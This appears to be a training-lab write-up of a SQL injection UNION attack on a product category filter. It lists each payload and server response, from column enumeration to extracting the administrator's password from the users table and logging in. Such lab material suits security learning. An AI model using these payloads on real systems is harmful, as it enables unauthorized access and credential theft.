# SQL injection, retrieving data from other tables

### Goal:
`Log in to the application as the administrator user`
### Info: The injection point is the product category filter
`target.com/filter?category=<input>`
### Info: The database contains the table 'users' and the columns 'username' and 'password'

<br><br>

**<ins>Step 1: Test injection point</ins>**

category='

`500: server error`

category='--

`200`
<br><br>

**<ins>Step 2: Enumerate data output with UNION attack</ins>**

category='UNION SELECT NULL--

`500 server error`<br><br>

category='UNION SELECT NULL,NULL--

`200`

category='UNION SELECT 'a','b'--

`200`

This means that each column can output strings.<br><br>

**<ins>Step 3: Exfiltrate the data</ins>**

category='UNION SELECT password,NULL FROM users WHERE username='administrator'--

`<password>`

Attempting to log in with this password grants us administrative access.
